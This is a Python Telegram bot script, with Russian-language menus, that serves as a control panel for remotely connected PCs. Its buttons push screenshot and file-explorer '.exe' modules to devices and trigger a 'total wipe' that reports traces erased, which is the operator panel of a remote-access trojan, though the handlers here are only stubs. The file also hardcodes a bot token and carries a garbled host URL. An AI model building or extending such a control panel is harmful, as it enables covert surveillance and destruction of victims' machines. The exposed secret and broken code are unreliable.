import os
import telebot
from flask import Flask, request
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "9213726416:AAHSKz3sdyxo05XS-yX0dH_1h6FGg7PKA_k"
bot = telebot.TeleBot(TOKEN, threaded=False)

app = Flask(__name__)

connected_devices = {}
module_storage = {}

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if not connected_devices:
        bot.send_message(message.chat.id, "Нет подключенных устройств.")
        return

    markup = InlineKeyboardMarkup()
    for cid, data in connected_devices.items():
        markup.add(InlineKeyboardButton(text=f"ПК: {data['name']} ({cid})", callback_data=f"dev_{cid}"))
    bot.send_message(message.chat.id, "Панель управления. Выберите устройство:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("dev_"))
def device_menu(call):
    cid = call.data.split("_")[1]
    name = connected_devices.get(cid, {}).get("name", "Unknown")
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(text="Переименовать ПК", callback_data=f"rename_{cid}"))
    markup.add(InlineKeyboardButton(text="Проверить модули", callback_data=f"chkmods_{cid}"))
    markup.add(InlineKeyboardButton(text="Загрузить модуль", callback_data=f"loadmod_{cid}"))
    markup.add(InlineKeyboardButton(text="ТОТАЛЬНОЕ УДАЛЕНИЕ (WIPE)", callback_data=f"wipe_{cid}"))
    markup.add(InlineKeyboardButton(text="Назад к списку", callback_data="back_home"))
    
    bot.edit_message_text(f"Управление устройством: {name}", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("chkmods_"))
def check_modules_cmd(call):
    cid = call.data.split("_")[1]
    mods = module_storage.get(cid, [])
    res = "Загруженные модули:\n" + "\n".join([f"- {m}" for m in mods]) if mods else "На устройстве нет активных модулей."
    bot.answer_callback_query(call.id, "Проверка завершена")
    bot.send_message(call.message.chat.id, res)

@bot.callback_query_handler(func=lambda call: call.data.startswith("loadmod_"))
def load_module_menu(call):
    cid = call.data.split("_")[1]
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(text="Модуль: Скриншот", callback_data=f"dlmod_{cid}_mod_screen.exe"))
    markup.add(InlineKeyboardButton(text="Модуль: Проводник", callback_data=f"dlmod_{cid}_mod_explorer.exe"))
    markup.add(InlineKeyboardButton(text="Назад", callback_data=f"dev_{cid}"))
    bot.edit_message_text("Выберите модуль для загрузки:", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("dlmod_"))
def send_mod_to_device(call):
    _, cid, mod_name = call.data.split("_")
    if cid not in module_storage:
        module_storage[cid] = []
    if mod_name not in module_storage[cid]:
        module_storage[cid].append(mod_name)
    bot.answer_callback_query(call.id, f"Модуль {mod_name} отправлен!")
    bot.send_message(call.message.chat.id, f"Модуль [{mod_name}] доставлен на устройство.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("wipe_"))
def wipe_device_cmd(call):
    cid = call.data.split("_")[1]
    if cid in connected_devices:
        del connected_devices[cid]
    bot.answer_callback_query(call.id, "Команда отправлена.")
    bot.edit_message_text("Устройство уничтожено, следы стерты.", call.message.chat.id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "back_home")
def go_home(call):
    start_cmd(call.message)

if __name__ == "__main__":
    # Установка вебхука при старте (замени URL на адрес твоего бесплатного хостинга, например от Render)
    HOST_URL = "https://tg-bot-bekv.onrender.com](https://tg-bot-bekv.onrender.com" 
    bot.remove_webhook()
    bot.set_webhook(url=f"{HOST_URL}/{TOKEN}")
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
